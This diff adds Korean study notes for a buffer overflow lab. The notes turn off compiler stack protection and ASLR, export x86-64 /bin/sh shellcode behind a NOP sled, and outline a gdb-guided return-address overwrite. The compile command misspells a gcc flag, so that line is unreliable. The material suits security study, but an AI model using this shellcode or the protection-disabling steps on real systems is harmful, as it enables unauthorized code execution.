@@ -1,0 +1,50 @@
+#+TITLE: Buffer Overflow 공격 실습
+
+* 버퍼 오버플로우 실습을 위한 설정
+** gcc 컴파일러 설정
+| option                       | description                                 |
+|------------------------------+---------------------------------------------|
+| -fno-stack-protector         | 스택 보호 기능(canary) 끄기                 |
+| -mpreferred-stack-boundary=4 | 스택 바운더리 크기, 64비트 환경에서는 4로 지정한다. |
+| -z execstack                 | 스택 실행가능하게(?)                        |
+|                              |                                             |
+
+
+위의 옵션을 사용한 컴파일 예
+#+BEGIN_SRC bash
+gcc -fno-stack-protector -mpreffered-stack-boundary=4 -z execstack shell.c -o shell
+#+END_SRC
+
+** ASLR 끄기
+셸에서 다음 명령어를 실행한다.
+#+BEGIN_SRC bash
+sysctl -w kernel.randomize_va_space=0
+#+END_SRC
+
+
+* 셸 코드 환경변수 만들기
+- 0x90 은 NOP (아무것도 하지 않음, No Operation) 을 의미함
+- Nop 코드 다음에 셸코드를 삽입한다. 
+- 셸 코드는 이곳을 참고 [fn:1]
+
+#+BEGIN_SRC bash
+export SHELLCODE=`perl -e 'print "\x90" x 2000, "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
+#+END_SRC
+
+* 실습 과정 요약
+1) 셸코드 환경변수를 export 한다. (export 하면 메모리 상의 어딘가에 존재하고 있을 것이다.)
+
+2) overflow 프로그램을 gdb 로 실행한다. 이 때 목적은 export 한 셸코드의 대략적인 주소를 알아내는 것이다. 
+2-1) 메인함수에 브레이크 포인트를 건 다음 run 
+2-2) x/100a $rsp 명령 실행 (메모리의 값을 확인) 해서 SHELLCODE 에서 실제 셸코드가 있는 주소에서 조금 전의 주소를 알아낸다.
+
+3) 위의 주소를 토대로 공격 페이로드를 만들어서 overflow 프로그램에 전달한다. 
+
+다음과 같은 명령이 사용된다. 
+
+./overflow `perl -e 'print "X" x 24, "\x88\xeb\x.."'` // 위어에 얻어낸 주소를 리틀엔디언 방식으로 표현
+
+
+* Ref
+https://www.youtube.com/watch?v=eJWlg-VoCBg&list=PLRx0vPvlEmdAXwJnNtKIVeC27UmwljRYA&index=13
+[fn:1] http://shell-storm.org/shellcode/files/shellcode-806.php
